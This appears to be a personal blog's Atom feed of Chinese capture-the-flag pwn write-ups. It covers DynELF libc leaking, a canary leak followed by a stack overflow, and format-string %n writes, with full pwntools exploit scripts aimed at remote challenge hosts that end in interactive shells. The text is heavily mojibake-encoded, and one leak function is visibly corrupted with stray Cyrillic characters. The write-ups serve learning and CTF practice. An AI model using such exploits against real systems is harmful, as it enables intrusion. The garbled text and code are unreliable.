<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://cc-nianchu.github.io</id>
    <title>nianchu</title>
    <updated>2021-07-21T05:27:14.290Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://cc-nianchu.github.io"/>
    <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
    <subtitle>nianchuçš„blog</subtitle>
    <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
    <icon>https://cc-nianchu.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, nianchu</rights>
    <entry>
        <title type="html"><![CDATA[DynELF]]></title>
        <id>https://cc-nianchu.github.io/post/dynelf/</id>
        <link href="https://cc-nianchu.github.io/post/dynelf/">
        </link>
        <updated>2021-07-21T04:27:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="dynelfåŸç†">DynELFåŸç†</h2>
<p>é€šè¿‡ä¿¡æ¯æ³„éœ²æ¼æ´ï¼ŒDynELFå°†å¯¹ä»»æ„å†…å­˜è¿›è¡Œæœç´¢,å®ƒé¦–å…ˆæ‰¾åˆ°ELFæ–‡ä»¶åœ¨å†…å­˜ä¸­çš„åŸºåœ°å€ï¼Œç„¶åå®šä½åˆ°libeå¹¶å¯¹å…¶è¿›è¡Œè§£æï¼Œä»è€Œæ‰¾åˆ°æ‰€éœ€å‡½æ•°ç¬¦å·çš„åœ°å€ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ã€‚</p>
<p>(1)æœç´¢å†…å­˜æ‰¾åˆ°å­—ç¬¦ä¸²â€œ\x7ELFâ€ï¼Œ è¯¥å­—ç¬¦ä¸²çš„åœ°å€å³ä¸ºELFçš„åŸºåœ°å€;</p>
<p>(2)è§£æELFæ–‡ä»¶ï¼Œå¾—åˆ°DYNAMICæ®µçš„åŸºåœ°å€ï¼Œå¹¶é€šè¿‡è¯¥åœ°å€å¾—åˆ°link mapé“¾è¡¨ï¼Œæ­¤æ—¶æœ‰ä¸¤ç§æ–¹æ³•:ä¸€ç§ æ˜¯é€šè¿‡.dynamicé‡Œçš„DT DEBUG,å®ƒæ˜¯ä¸€ä¸ªæŒ‡å‘ structr debugçš„æŒ‡é’ˆï¼Œå…¶ç¬¬äºŒä¸ªå…ƒç´ æŒ‡å‘link map;å¦ä¸€ç§æ˜¯é€šè¿‡.got.pltèŠ‚ï¼Œå…¶å‰3é¡¹åˆ†åˆ«æ˜¯.dynamicã€link_ map å’Œdl _runtime resolveçš„åœ°å€;</p>
<p>(3 )éå†link map,å¯¹æ¯”1_ nameæ‰¾åˆ°libcåï¼Œé€šè¿‡1 addrè·å¾—libcçš„åŸºåœ°å€;</p>
<p>( 4)è§£ælibc,é€šè¿‡DT_ _GNU HASHã€DT STRTAB:å’ŒDT SYMTABåˆ†åˆ«å¾—åˆ°å“ˆå¸Œè¡¨( .gnu hash/ .hash)ã€å­—ç¬¦ä¸²è¡¨(sttab )å’Œç¬¦å·è¡¨( symtab );</p>
<p>(5)é€šè¿‡å“ˆå¸Œè¡¨æ‰¾åˆ°æ‰€éœ€å‡½æ•°(å¦‚system )çš„å†…å­˜åœ°å€ã€‚</p>
<h2 id="ä¾‹é¢˜-xdctf-2015pwn200-æ”»é˜²ä¸–ç•Œè¿›é˜¶åŒºç¬¬äºŒé¢˜">ä¾‹é¢˜ XDCTF 2015:pwn200  æ”»é˜²ä¸–ç•Œè¿›é˜¶åŒºç¬¬äºŒé¢˜</h2>
<p>è·å¾—é¢˜ç›®åå…ˆchecksec pwn_200</p>
<pre><code> Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>æ‰“å¼€ida32 F5è·å¾—ä¼ªä»£ç </p>
<pre><code>int __cdecl main()
{
  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF

  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);
  memset(&amp;buf[24], 0, 0x4Cu);
  setbuf(stdout, buf);
  write(1, buf, strlen(buf));
  sub_8048484();
  return 0;
}
ssize_t sub_8048484()
{
  char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF

  setbuf(stdin, buf);
  return read(0, buf, 0x100u);
}
</code></pre>
<h3 id="ç¨‹åºåˆ†æ">ç¨‹åºåˆ†æ</h3>
<p>æ¼æ´æ¯”è¾ƒæ˜æ˜¾ï¼Œsub 80484840å‡½æ•°è¯•å›¾è¯»å–010ä¸ªå­—èŠ‚åˆ°ä¸ª0x6eå­—èŠ‚å¤§å°çš„bufä¸Šï¼Œå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ç”±äºæ²¡æœ‰Canay,æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾åœ°åœ¨æ ˆä¸Šå¸ƒç½®ROPé“¾ã€å¹¶æ§åˆ¶EIPã€‚åªéœ€è¦æ³¨æ„32ä½ç¨‹åºé€šè¿‡æ ˆä¼ é€’å‚æ•°ã€‚</p>
<h3 id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</h3>
<p>(1)åˆ©ç”¨æ ˆæº¢å‡ºï¼Œåœ¨æ ˆä¸Šå¸ƒç½®ROPé“¾ï¼Œä¿®æ”¹è¿”å›åœ°å€ï¼Œä»è€Œæ§åˆ¶EIP:</p>
<p>(2 )åˆ©ç”¨wrieOå‡½æ•°æ„é€ DynELFçš„leakå‡½æ•°ï¼Œè¿›è¡Œä¿¡æ¯æ³„éœ²ï¼Œä»è€Œå¾—åˆ°libe,ä»ä¸­æŸ¥æ‰¾system0å‡½æ•°çš„åœ°å€;</p>
<p>(3)åˆ©ç”¨read(0å‡½æ•°å°†å­—ç¬¦ä¸²â€œin/hsx00&quot; è¯»äºº.bss èŠ‚;</p>
<p>(4)è°ƒç”¨system(&quot;/bin/sh&quot;),è·å¾—shell.</p>
<p>ç¬¬ä¸€é˜¶æ®µåˆ©ç”¨DynELFæ³„éœ²å¾—åˆ°system()å‡½æ•°çš„å†…å­˜åœ°å€ï¼Œleak func()å¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<pre><code>def leak func (addr) :

io. recvline ()

payload= &quot;Ğ&quot;*(0Ñ…Ğ±Ñ +4)

payload += p32 (write_ plt)

# write(1, addr, 4)

payload += p32 (pppr_addr)

clean the stack

payload += p32 (1)

payload += p32 (addr)

payload += p32 (4)

payload += p32(_start_addr)                 # start again

io. send (payload)

data = io. recv(4)

log. info(&quot;leaking: 0x%x -&gt; %s&quot; 8 (addr, (data or '') .encode('hex')))
return data
</code></pre>
<p>æ¯æ¬¡æ‰§è¡Œwrite()å‡½æ•°åï¼Œéƒ½éœ€è¦ä¸€ä¸ª&quot;pop;pop;pop;ret&quot;çš„gadgetå°†3ä¸ªå‚æ•°å¼¹å‡ºï¼Œä»è€Œä½¿æ ˆè¾¾åˆ°å¹³è¡¡ï¼Œç„¶åå†è¿”å›åˆ°startå‡½æ•°å¼€å¯ä¸‹ä¸€è½®ï¼Œä»è€Œæ»¡è¶³DynELFéœ€è¦å¾ªç¯æ³„æ¼çš„æ¡ä»¶</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å¾—Canaryè¿›è¡Œæ ˆæº¢å‡º]]></title>
        <id>https://cc-nianchu.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-huo-de-canary-jin-xing-zhan-yi-chu/</id>
        <link href="https://cc-nianchu.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-huo-de-canary-jin-xing-zhan-yi-chu/">
        </link>
        <updated>2021-07-18T02:21:16.000Z</updated>
        <content type="html"><![CDATA[<p>é¢˜ç›®åœ¨æ”»é˜²ä¸–ç•Œè¿›é˜¶åŒºç¬¬ä¸€é¢˜Mary_Mortonï¼Œä¹Ÿæ˜¯ä¸€é“åŸºç¡€é¢˜<br>
æ‹¿åˆ°é¢˜ç›®å…ˆchecksecä¸€ä¸‹</p>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>å‘ç°æ˜¯64ä½ç¨‹åºï¼Œè€Œä¸”å¼€äº†Canaryå’ŒNXä¿æŠ¤ æ‰“å¼€ida64 F5è·å¾—ä¼ªä»£ç </p>
<pre><code>void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int v3; // [rsp+24h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_4009FF();
  puts(&quot;Welcome to the battle ! &quot;);
  puts(&quot;[Great Fairy] level pwned &quot;);
  puts(&quot;Select your weapon &quot;);
  while ( 1 )
  {
    while ( 1 )
    {
      sub_4009DA();
      __isoc99_scanf(&quot;%d&quot;, &amp;v3);
      if ( v3 != 2 )
        break;
      sub_4008EB();
    }
    if ( v3 == 3 )
    {
      puts(&quot;Bye &quot;);
      exit(0);
    }
    if ( v3 == 1 )
      sub_400960();
    else
      puts(&quot;Wrong!&quot;);
  }
}
</code></pre>
<p>å¾ˆæ˜æ˜¾æ˜¯ä¸€é“ç»™é€‰æ‹©çš„é¢˜ç›®ï¼Œæ‰“å¼€é¢˜ç›®å‡½æ•°</p>
<pre><code>int sub_4009DA()
{
  puts(&quot;1. Stack Bufferoverflow Bug &quot;);
  puts(&quot;2. Format String Bug &quot;);
  return puts(&quot;3. Exit the battle &quot;);
}
</code></pre>
<p>é¢˜ç›®å·²ç»å‘Šè¯‰æˆ‘ä»¬1æ˜¯æ ˆæº¢å‡ºï¼Œ2æ˜¯å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´ï¼Œä½†æ˜¯å› ä¸ºå¼€äº†Canaryï¼Œæ‰€ä»¥è¦æ˜¯éœ€è¦æ ˆæº¢å‡ºæˆ‘ä»¬éœ€è¦è·å¾—Canaryçš„å€¼ï¼Œæ‰èƒ½è¿›è¡Œæ ˆæº¢å‡ºã€‚</p>
<pre><code>å‡½æ•°ä¸€
unsigned __int64 sub_400960()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(buf, 0, 0x80uLL);
  read(0, buf, 0x100uLL);
  printf(&quot;-&gt; %s\n&quot;, buf);
  return __readfsqword(0x28u) ^ v2;
}
å‡½æ•°äºŒ
unsigned __int64 sub_4008EB()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(buf, 0, 0x80uLL);
  read(0, buf, 0x7FuLL);
  printf(buf);
  return __readfsqword(0x28u) ^ v2;
}
åé—¨å‡½æ•°
int sub_4008DA()
{
  return system(&quot;/bin/cat ./flag&quot;);
}
</code></pre>
<p>å› ä¸ºæœ‰canaryä¿æŠ¤ï¼Œreturnçš„æ˜¯v2ï¼Œæ‰€ä»¥v2åº”è¯¥å°±æ˜¯canaryçš„å€¼<br>
<img src="https://cc-nianchu.github.io/post-images/1626575797030.png" alt="" loading="lazy"><br>
æ€è·¯ï¼šé¦–å…ˆåˆ©ç”¨å­—ç¬¦ä¸²æ¼æ´ï¼Œæ³„éœ²å‡ºcanaryçš„å€¼ï¼Œç„¶ååœ¨å‡½æ•°è¦è¿”å›çš„æ—¶å€™å†å¡«å›å»ï¼Œä¹‹ååˆ©ç”¨æ ˆæº¢å‡ºï¼Œè®©å…¶è¿”å›åˆ°åé—¨å‡½æ•°ã€‚<br>
å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´å…ˆæ‰‹è®¡ç®—åç§»é‡</p>
<pre><code>Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
2
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

AAAA 0x7fffc952c6c0 0x7f 0x7f08d64a3151 (nil) (nil) 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0xa7025 (nil) (nil) (nil) (nil) (nil)
</code></pre>
<p>åœ¨è¿™é‡Œå‘ç°å­—ç¬¦ä¸²åç§»é‡ä¸º6ï¼Œå†ç¡®å®šcanaryå’Œè¾“å…¥çš„å‚æ•°ä¹‹é—´çš„åç§»<br>
bufåˆ°v2   0x90-0x08=0x88<br>
å› ä¸ºè¿™æ˜¯64ä½çš„ç¨‹åºï¼Œæ¯ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯8å­—èŠ‚ï¼ŒåŒç†32ä½æ˜¯4å­—èŠ‚<br>
æ‰€ä»¥0x88=136   136/8=17    æ‰€ä»¥æ€»åç§»é‡ä¸º17+6=23<br>
æ‰€ä»¥ç¬¬ä¸€æ¬¡å…ˆæ³„æ¼canary<br>
ç¬¬ä¸€ä¸ªpayload='%23$p'<br>
ç„¶åcanary=int(recv(16),16)   æ¥å—16ä¸ªå­—èŠ‚<br>
ç„¶åprint canary<br>
æ„é€ ç¬¬äºŒä¸ªpayload ='a'*0x88+p64(canary)+'a'*8+p64(åé—¨å‡½æ•°åœ°å€)<br>
expå¦‚ä¸‹:</p>
<pre><code>from pwn import *

#r=process('./Mary_Morton')
r=remote('111.200.241.244',63833)

#r.recvuntil('3. Exit the battle')
r.sendline('2')

r.sendline('%23$p')

r.recvuntil('0x')
canary=int(r.recv(16),16)
print (canary)

door_addr=0x4008da
payload='a'*0x88+p64(canary)+'a'*8+p64(door_addr)
#r.recvuntil('3. Exit the battle')
r.sendline('1')
r.sendline(payload)

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ ¼å¼å­—ç¬¦ä¸²]]></title>
        <id>https://cc-nianchu.github.io/post/ge-shi-zi-fu-chuan/</id>
        <link href="https://cc-nianchu.github.io/post/ge-shi-zi-fu-chuan/">
        </link>
        <updated>2021-07-16T06:03:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="æ”»é˜²ä¸–ç•Œæ–°æ‰‹é¢˜cgfsb">æ”»é˜²ä¸–ç•Œæ–°æ‰‹é¢˜CGfsb</h2>
<p>è¿™é“é¢˜æ˜¯åœ¨æ”»é˜²ä¸–ç•Œæ–°æ‰‹é¢˜ é¢˜ç›®ä»‹ç»ä¸ºï¼šèœé¸¡é¢å¯¹ç€pringfå‘æ„ï¼Œä»–ä¸çŸ¥é“prinfé™¤äº†è¾“å‡ºè¿˜æœ‰ä»€ä¹ˆä½œç”¨<br>
æ‹¿åˆ°é¢˜ç›®åæˆ‘ä»¬å…ˆç”¨æœ€åŸºç¡€çš„checksecåŠŸèƒ½checkä¸€ä¸‹</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬å‘ç°ç¨‹åºæ˜¯32ä½çš„  ç”¨IDA32ä½æ‰“å¼€æ–‡ä»¶</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD buf[2]; // [esp+1Eh] [ebp-7Eh] BYREF
  __int16 v5; // [esp+26h] [ebp-76h]
  char s[100]; // [esp+28h] [ebp-74h] BYREF
  unsigned int v7; // [esp+8Ch] [ebp-10h]

  v7 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  buf[0] = 0;
  buf[1] = 0;
  v5 = 0;
  memset(s, 0, sizeof(s));
  puts(&quot;please tell me your name:&quot;);
  read(0, buf, 0xAu);
  puts(&quot;leave your message please:&quot;);
  fgets(s, 100, stdin);
  printf(&quot;hello %s&quot;, (const char *)buf);
  puts(&quot;your message is:&quot;);
  printf(s);
  if ( pwnme == 8 )
  {
    puts(&quot;you pwned me, here is your flag:\n&quot;);
    system(&quot;cat flag&quot;);
  }
  else
  {
    puts(&quot;Thank you!&quot;);
  }
  return 0;
}
</code></pre>
<p>æ ¹æ®æ–°æ‰‹æç¤º æˆ‘ä»¬å¾ˆå¿«å‘ç°printf(s)ï¼›è¿™å¥è¯æœ‰é—®é¢˜ï¼Œå¹³æ—¶æˆ‘ä»¬å­¦Cè¯­è¨€ï¼Œæ­£ç¡®çš„åº”è¯¥æ˜¯printf(&quot;%n&quot;,s);<br>
printfï¼ˆ&quot;æ ¼å¼åŒ–å­—ç¬¦ä¸²&quot;,å‚æ•°...)</p>
<pre><code class="language-æ ¼å¼åŒ–è¯´æ˜ç¬¦æœ‰è¿™äº›ï¼š">%d - åè¿›åˆ¶ - è¾“å‡ºåè¿›åˆ¶æ•´æ•°
%s - å­—ç¬¦ä¸² - ä»å†…å­˜ä¸­è¯»å–å­—ç¬¦ä¸²
%x - åå…­è¿›åˆ¶ - è¾“å‡ºåå…­è¿›åˆ¶æ•°
%c - å­—ç¬¦ - è¾“å‡ºå­—ç¬¦
%p - æŒ‡é’ˆ - æŒ‡é’ˆåœ°å€
%n - åˆ°ç›®å‰ä¸ºæ­¢æ‰€å†™çš„å­—ç¬¦æ•°
</code></pre>
<p>æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯%n è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯å°†%n ä¹‹å‰æ‰“å°å‡ºæ¥çš„å­—ç¬¦<br>
ä¸ªæ•°ï¼Œèµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ã€‚çœ‹ä¼ªä»£ç ï¼Œæˆ‘ä»¬å‘ç°è®©pwnme==8;è¿™å¥è¯æˆç«‹ä¹‹åæˆ‘ä»¬å°±å¯ä»¥è¿è¡Œcat flag è·å¾—flag<br>
å› æ­¤æˆ‘ä»¬éœ€è¦ï¼š<br>
1ã€æˆ‘ä»¬éœ€è¦å°† pwnme çš„åœ°å€è¾“å…¥åˆ° sï¼ˆä¹Ÿå°±æ˜¯ messageï¼‰ä¸­å»<br>
2ã€åœ¨åˆé€‚çš„ä½ç½®ä¸ŠåŠ ä¸€ä¸ª<code>%n</code>ï¼Œä½¿å…¶ä¸æˆ‘ä»¬è¾“å…¥çš„åœ°å€å¯¹åº”ä»è€Œé€ æˆæ¼æ´åˆ©ç”¨<br>
ä½†æˆ‘ä»¬éœ€è¦çŸ¥é“è¾“å…¥è¿›å»çš„æ•°æ®åœ¨æ ˆä¸­åç§»äº†å¤šå°‘ï¼ŒçŸ¥é“åç§»é‡åæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨pwnmeã€‚<br>
è¿è¡Œç¨‹åº:</p>
<pre><code>please tell me your name:
nianchu
leave your message please:
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
hello nianchu
your message is:
AAAA 0xffc1cc3e 0xf7f4b5c0 0xffc1cc8c 0xf7f91a9c 0x1 0xf7f64410 0x696e0001 0x68636e61 0xa75 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
Thank you!
</code></pre>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬æ•°æ•°AAAAå¯¹åº”çš„åº”è¯¥æ˜¯0x41414141ï¼Œæˆ‘ä»¬å‘ç°0x41414141åœ¨ç¬¬10ä¸ªï¼Œåç§»é‡ä¾¿ä¸º10<br>
éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ä¸Šé¢ç»™å‡ºçš„æ–¹æ³•ï¼Œéƒ½æ˜¯ä¾æ¬¡è·å¾—æ ˆä¸­çš„æ¯ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬è¦ç”¨åˆ°ç¬¬åä¸ªï¼Œæ‰€ä»¥æ˜¯%10$n<br>
æ‰€ä»¥EXPå°±æœ‰äº†</p>
<pre><code>from pwn import*
#q=precess(&quot;./CGfsb&quot;)
q=remote('111.200.241.244',51786)

pwnme_addr=0x0804A068
payload=p32(pwnme_addr)+'ssbb'+'%10$n'
q.recvuntil(&quot;please tell me your name:\n&quot;)
q.sendline('nianchu')
q.recvuntil(&quot;leave your message please:\n&quot;)
q.sendline(payload)

q.interactive()
</code></pre>
<h2 id="buuä¸Šçš„ç¬¬äº”ç©ºé—´2019-å†³èµ›pwn5">buuä¸Šçš„[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5</h2>
<p>è¿™æ˜¯ä¸€é“å¾ˆæ˜æ˜¾æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸è¿‡åº”è¯¥è¿˜æœ‰å…¶ä»–çš„è§£æ³•ä»¥åå­¦äº†å†æ¥ç”¨å…¶ä»–çš„æ–¹æ³•ï¼Œä¸»è¦æ˜¯å‘ç°äº†/bin/sh<br>
è¿™é“é¢˜æˆ‘æ˜¯ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²åšçš„ä½†æ˜¯ä¸æ˜¯å¾ˆç†Ÿç»ƒåšäº†å¥½ä¹…ï¼Œåˆgetåˆ°æ–°çŸ¥è¯†ã€‚<br>
é¦–å…ˆchecksecä¸€ä¸‹pwn5æ–‡ä»¶</p>
<pre><code>Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
</code></pre>
<p>ç„¶åç”¨ida32ä½æ‰“å¼€pwn5æ–‡ä»¶ æŒ‰F5æ‰“å¼€ä¼ªä»£ç </p>
<pre><code>int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &amp;a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open(&quot;/dev/urandom&quot;, 0);
  read(fd, &amp;dword_804C044, 4u);        //éšæœº4ä½æ•°
  printf(&quot;your name:&quot;);
  read(0, buf, 0x63u);
  printf(&quot;Hello,&quot;);
  printf(buf);
  printf(&quot;your passwd:&quot;);
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
     puts(&quot;ok!!&quot;);
     system(&quot;/bin/sh&quot;);
  }
  else
  {
     puts(&quot;fail&quot;);
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
     sub_80493D0();
  return result;
}
</code></pre>
<p>èƒ½è¿è¡Œsystem(&quot;/bin/sh&quot;)å¾ˆæ˜æ˜¾æ˜¯è¦atoi(nptr)=dword_804C044ï¼Œè¿™æ˜¯ä¸€é“éªŒè¯è´¦å·å¯†ç é¢˜ç›®ï¼Œå¯†ç åœ¨ä¸Šé¢ä¼šéšæœº4ä½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†å¯†ç æ”¹æˆè‡ªå·±æƒ³è¦çš„å°±è¡Œäº†ï¼Œ%dè¯»å–æ•°å­—ï¼Œ%xè¯»å–åœ°å€ï¼Œ%sè¯»å–ä»»æ„åœ°å€çš„å†…å®¹ï¼Œ%nä»»æ„åœ°å€å†™å…¥ã€‚ ä¾‹å¦‚aaaa%n=4,å› ä¸ºè¦å†™å…¥4ä½æ•°æ‰€ä»¥æˆ‘ä»¬åœ¨0x804C044è¿™ä¸ªåœ°å€ä¸Šå¾—åˆ†4byte<br>
<img src="https://cc-nianchu.github.io/post-images/1626489125752.png" alt="" loading="lazy"><br>
è¿™é‡Œé…åˆä¸Šé¢è®²çš„%10<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">ä¸€</mi><mi mathvariant="normal">æ ·</mi><mi mathvariant="normal">çš„</mi><mi mathvariant="normal">é“</mi><mi mathvariant="normal">ç†</mi><mi mathvariant="normal">ï¼Œ</mi></mrow><annotation encoding="application/x-tex">nï¼Œä¸€æ ·çš„é“ç†ï¼Œ%10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">æ ·</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">é“</span><span class="mord cjk_fallback">ç†</span><span class="mord cjk_fallback">ï¼Œ</span></span></span></span>næ˜¯ä¸€æ¬¡å 4ä¸ªå­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬åˆ†å¼€ã€‚<br>
é¦–å…ˆæˆ‘ä»¬å¾—æ‰¾åˆ°åç§»é‡ï¼Œæ‰“å¼€ç¨‹åºè¾“å…¥AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</p>
<pre><code>your name:AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
Hello,AAAA 0xffe1b8d8 0x63 (nil) 0xf7f8da9c 0x3 0xf7f60410 0x1 (nil) 0x1 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
ï¿½ï¿½sï¿½ï¿½your passwd:
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°ç¬¬åä¸ªå°±æ˜¯åç§»é‡ï¼Œç°åœ¨ä¹Ÿæ‰¾åˆ°åç§»é‡ä¹Ÿæ‰¾åˆ°å‡½æ•°åœ°å€0x804c044ï¼Œ<br>
è€Œå¯†ç å°±æ˜¯4 * len(p32()) = 0x10ç›´æ¥ä¸ŠEXP</p>
<pre><code>from pwn import*
#q=process(&quot;./pwn5&quot;)

q=remote('node4.buuoj.cn',28993)

addr=0x0804c044

payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)

payload+='%10$hhn%11$hhn%12$hhn%13$hhn'
#payload+='%10$n%11$n%12$n%13$n'
#q.recvuntil(&quot;your name:\n&quot;)
q.sendline(payload)

#q.recvuntil(&quot;your passwd:\n&quot;)
payload=str(0x10101010)

q.sendline(payload)

q.interactive()
</code></pre>
<p>å¦å¤–æé†’ä¸€ä¸‹  pyæ–‡ä»¶ä¸èƒ½èµ·åä¸ºpwn.pyï¼Œæˆ‘ä¹Ÿä¸æ‡‚ä¸ºä»€ä¹ˆï¼Œåæ­£èµ·åäº†è¿™ä¸ªæˆ‘æäº†å¥½ä¹…éƒ½æ˜¯æœ‰é”™è¯¯ä¸Šç½‘æ‰¾äº†å¥½ä¹…éƒ½ä¸è¡Œï¼Œåé¢å‘ç°æ”¹äº†ä¸ªåå­—å°±èƒ½è¿è¡Œäº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[shellcode åŸºç¡€]]></title>
        <id>https://cc-nianchu.github.io/post/shellcode-ji-chu/</id>
        <link href="https://cc-nianchu.github.io/post/shellcode-ji-chu/">
        </link>
        <updated>2021-07-14T12:17:14.000Z</updated>
        <summary type="html"><![CDATA[<p>shellcodeåŸç†å°±æ˜¯è®©ç¨‹åºä¸­æŸä¸ªå‡½æ•°æ‰§è¡Œç»“æŸåï¼Œè¿”å›åˆ°shellcodeçš„åœ°å€å»æ‰§è¡Œshellcodeï¼Œç›®çš„æ˜¯ä¸ºäº†è·å–shellï¼Œshellcodeæ˜¯æ ˆæº¢å‡ºä¸­ä¸€ç§ç®€å•ä¸”å¸¸è§„çš„æ“ä½œï¼Œéœ€è¦é…åˆropç­‰æŠ€æœ¯ä¸€èµ·ä½¿ç”¨ã€‚<br>
ret2shellcodeé¢˜å‹å–ret2textå·®ä¸å¤šï¼Œä½†ret2shellcodeæ²¡æœ‰/bin/sh åé—¨ç›´æ¥åˆ©ç”¨çš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è‡ªå·±æ„é€ shellcodeã€‚<br>
shellcodeï¼ˆæŒ‡ä»¤ä¸º:shellcode = asm(shellcraft.sh())ï¼‰<br>
é¢˜ç›®ret2shellcodeï¼Œåšé¢˜å‰éœ€è¦checksecä¸€ä¸‹æœ‰ä»€ä¹ˆä¿æŠ¤ä»¥åŠæ˜¯å¤šå°‘ä½çš„ç¨‹åº</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>åœ¨è¿™é‡Œå‘ç°æ˜¯32ä½ç¨‹åºè€Œä¸”å¼€äº†NXä¿æŠ¤æ‰“å¼€IDA32æŒ‰F5è¿›å…¥mainå‡½æ•°ä¼ªä»£ç </p>
<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&quot;No system for you this time !!!&quot;);
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf(&quot;bye bye ~&quot;);
  return 0;
}
</code></pre>
